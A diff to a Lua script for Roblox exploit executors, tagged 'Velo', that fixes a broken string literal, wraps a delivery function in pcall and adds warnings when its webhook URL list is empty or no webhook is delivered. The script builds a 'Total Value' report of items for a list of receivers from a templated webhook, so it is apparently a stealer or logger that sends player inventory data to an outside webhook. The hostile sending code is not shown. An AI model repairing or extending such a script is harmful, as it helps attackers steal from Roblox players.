@@ -103,6 +103,7 @@ for _, receiver in ipairs(receivers) do
 end
 
 if #tbl2 == 0 then
+	warn("[Velo] SKIPPED: webhook URL list (tbl2) is empty — check that {{WEBHOOK}} template placeholder was replaced and the URL is not blank.")
 	return
 end
 
@@ -1572,7 +1573,7 @@ end
 
 local str9 = table.concat(str9Lines, "\n"):gsub("\n+$", "")
 local str10 = string.format("%.2f", n8 * 15 / 1000)
-local str11 = "local str11 = "💰 Total Value ➜ " .. fn26(n8) .. " / " .. str10 .. "\n" .. "==============================\n\n" .. str9
+local str11 = "💰 Total Value ➜ " .. fn26(n8) .. " / " .. str10 .. "\n" .. "==============================\n\n" .. str9
 local v9 = identifyexecutor or getexecutorname
 local str12 = "Unknown"
 
@@ -1971,9 +1972,15 @@ game:GetService("GuiService").ErrorMessageChanged:Connect(function(arg)
 end)
 
 task.spawn(function()
-	local success = fn32()
+	local ok_outer, success = pcall(fn32)
+	if not ok_outer then
+		warn("[Velo] fn32() threw an unhandled error: " .. tostring(success))
+		return
+	end
 	if success then
 		fn35(nil)
+	else
+		warn("[Velo] fn32() returned false — no webhook was delivered successfully. Check HTTP status warnings above.")
 	end
 end)
 
